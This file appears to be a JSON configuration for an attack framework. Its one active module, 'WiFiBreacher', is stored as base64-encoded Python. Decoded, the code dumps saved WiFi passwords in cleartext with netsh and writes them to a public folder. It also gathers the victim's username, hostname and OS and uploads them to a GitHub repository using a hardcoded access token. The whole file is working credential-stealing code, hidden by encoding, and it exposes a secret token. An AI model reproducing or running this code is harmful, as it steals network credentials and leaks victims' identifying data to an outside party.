{
  "modules": [
    {
      "active" : true,
      "name": "WiFiBreacher",
      "duration": 20,
      "path": "Y2xhc3MgV2lGaUJyZWFjaGVyKCk6CiAgICBkZWYgX19pbml0X18oc2VsZiwgc2NyaXB0X25hbWUpOgogICAgICAgIHNlbGYuc2NyaXB0X25hbWUgPSBzY3JpcHRfbmFtZQogICAgCiAgICBkZWYgY3JlYXRlX2xvZyhzZWxmLHNjcmlwdF9uYW1lLHN0YXR1cyk6CiAgICAgICAgJycnVGhpcyBmdW5jdGlvbiB3aWxsIGNyZWF0ZSBhIGxvZyAoc3VjY2VzL2ZhaWxlZCkgZGVwZW5kaW5nIG9uIHRoZSBzY3JpcHQncyByZXN1bHRzJycnCiAgICAgICAgaW1wb3J0IHNvY2tldAogICAgICAgIGltcG9ydCBwbGF0Zm9ybQogICAgICAgIGltcG9ydCBiYXNlNjQKICAgICAgICBpbXBvcnQgZ2V0cGFzcwogICAgICAgIGltcG9ydCBkYXRldGltZQogICAgICAgIGZyb20gZ2l0aHViIGltcG9ydCBHaXRodWIKICAgICAgICBpbXBvcnQgZGF0ZXRpbWUKICAgICAgICBBQ0NFU1NfVE9LRU4gPSdnaHBfeDIzMFEzblhMY0V1MW1aVDZQRHVERzM4TzVOMnhYM05OUVlzJwogICAgICAgIEZPTERFUl9QQVRIID0nbG9ncycKICAgICAgICBjdXJyZW50X2RhdGV0aW1lID0gZGF0ZXRpbWUuZGF0ZXRpbWUubm93KCkKICAgICAgICBjb250ZW50ID0gZiJTY3JpcHQgTmFtZToge3NjcmlwdF9uYW1lfVxuRXhlY3V0aW9uIHRpbWU6IHtjdXJyZW50X2RhdGV0aW1lfVxuU3RhdHVzOiB7c3RhdHVzfVxuXG4iCiAgICAgICAgdXNlcm5hbWUgPSBnZXRwYXNzLmdldHVzZXIoKQogICAgICAgIGhvc3RuYW1lID0gc29ja2V0LmdldGhvc3RuYW1lKCkKICAgICAgICBvc19uYW1lID0gcGxhdGZvcm0uc3lzdGVtKCkKICAgICAgICBmaWxlbmFtZSA9IG9zX25hbWUgKyAiXyIgKyBob3N0bmFtZSArICJfIiArIHVzZXJuYW1lCiAgICAgICAgZyA9IEdpdGh1YihBQ0NFU1NfVE9LRU4pCiAgICAgICAgcmVwbyA9IGcuZ2V0X3JlcG8oInJzZWN1cml0eTEyL3B5dGhvbl9vcGRyYWNodCIpCiAgICAgICAgCiAgICAgICAgdHJ5OgogICAgICAgICAgICBleGlzdGluZ19maWxlID0gcmVwby5nZXRfY29udGVudHMoZiJ7Rk9MREVSX1BBVEh9L3tmaWxlbmFtZX0iKQogICAgICAgICAgICBzaGEgPSBleGlzdGluZ19maWxlLnNoYQogICAgICAgICAgICBleGlzdGluZ19jb250ZW50ID0gYmFzZTY0LmI2NGRlY29kZShleGlzdGluZ19maWxlLmNvbnRlbnQpLmRlY29kZSgpCiAgICAgICAgICAgIG5ld19jb250ZW50ID0gZXhpc3RpbmdfY29udGVudCArICdcbicgKyBjb250ZW50CiAgICAgICAgICAgIHJlcG8udXBkYXRlX2ZpbGUoZXhpc3RpbmdfZmlsZS5wYXRoLCAiVXBkYXRlIGxvZyIsIG5ld19jb250ZW50LCBzaGEpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBpZiAnTm90IEZvdW5kJyBpbiBzdHIoZSk6CiAgICAgICAgICAgICAgICBuZXdfZmlsZSA9IHJlcG8uY3JlYXRlX2ZpbGUoZiJ7Rk9MREVSX1BBVEh9L3tmaWxlbmFtZX0iLCAiTmV3IGxvZyIsIGNvbnRlbnQpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgCiAgICBkZWYgcnVuKHNlbGYpOgogICAgICAgICcnJ1RoaXMgZnVuY3Rpb24gd2lsbCB0cnkgdG8gcmVjb3ZlciBzYXZlZCBXaUZpIHBhc3N3b3JkcyBhbmQgc2VuZCBpdHMgb3V0cHV0IHRvIEM6IFVzZXJzIFB1YmxpYyB3aWZpX2RhdGEnJycKICAgICAgICBpbXBvcnQgc3VicHJvY2VzcwogICAgICAgIGltcG9ydCByZQogICAgICAgIGltcG9ydCBvcwogICAgICAgIHdpZmlfcGF0aCA9ICJDOlxcVXNlcnNcXFB1YmxpY1xcd2lGaV9vdXRwdXQiCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHdpZmlfcGF0aCk6CiAgICAgICAgICAgIG9zLm1ha2VkaXJzKHdpZmlfcGF0aCkKICAgICAgICBjb21tYW5kX291dHB1dCA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KFsnbmV0c2gnLCAnd2xhbicsICdzaG93JywgJ3Byb2ZpbGVzJ10pLmRlY29kZSgndXRmLTgnKQogICAgICAgIHByb2ZpbGVfbmFtZXMgPSByZS5maW5kYWxsKHInOlxzKC4qKVxyJywgY29tbWFuZF9vdXRwdXQpCiAgICAgICAgd2lmaV9wYXNzd29yZHMgPSBbXQogICAgCiAgICAgICAgZm9yIG5hbWUgaW4gcHJvZmlsZV9uYW1lczoKICAgICAgICAgICAgcGFzc3dvcmRfb3V0cHV0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoWyduZXRzaCcsICd3bGFuJywgJ3Nob3cnLCAncHJvZmlsZScsIG5hbWUsICdrZXk9Y2xlYXInXSkuZGVjb2RlKCd1dGYtOCcpCiAgICAgICAgICAgIHBhc3N3b3JkID0gcmUuc2VhcmNoKHInS2V5IENvbnRlbnRccyo6ICguKilccicsIHBhc3N3b3JkX291dHB1dCkKICAgICAgICAgICAgaWYgcGFzc3dvcmQ6CiAgICAgICAgICAgICAgICB3aWZpX3Bhc3N3b3Jkcy5hcHBlbmQoKG5hbWUsIHBhc3N3b3JkLmdyb3VwKDEpKSkKCiAgICAgICAgaWYgd2lmaV9wYXNzd29yZHM6CiAgICAgICAgICAgIGZvciBuYW1lLCBwYXNzd29yZCBpbiB3aWZpX3Bhc3N3b3JkczoKICAgICAgICAgICAgICAgIGZpbGVfcGF0aCA9IG9zLnBhdGguam9pbih3aWZpX3BhdGgsIGYie25hbWV9X3Bhc3N3b3JkLnR4dCIpCiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAndycpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgZmlsZS53cml0ZShmIk5ldHdvcmsgTmFtZToge25hbWV9XG4iKQogICAgICAgICAgICAgICAgICAgIGZpbGUud3JpdGUoZiJQYXNzd29yZDoge3Bhc3N3b3JkfVxuIikKICAgICAgICBlbHNlOgogICAgICAgICAgICBwYXNzCgp3aWZpX2JyZWFjaGVyID0gV2lGaUJyZWFjaGVyKCJXaUZpQnJlYWNoZXIiKQp0cnk6CiAgICB3aWZpX2JyZWFjaGVyLnJ1bigpCiAgICB3aWZpX2JyZWFjaGVyLmNyZWF0ZV9sb2cod2lmaV9icmVhY2hlci5zY3JpcHRfbmFtZSwic3VjY2VzcyIpCmV4Y2VwdDoKICAgIHdpZmlfYnJlYWNoZXIuY3JlYXRlX2xvZyh3aWZpX2JyZWFjaGVyLnNjcmlwdF9uYW1lLCJmYWlsZWQiKQ=="
    }
  ]
}
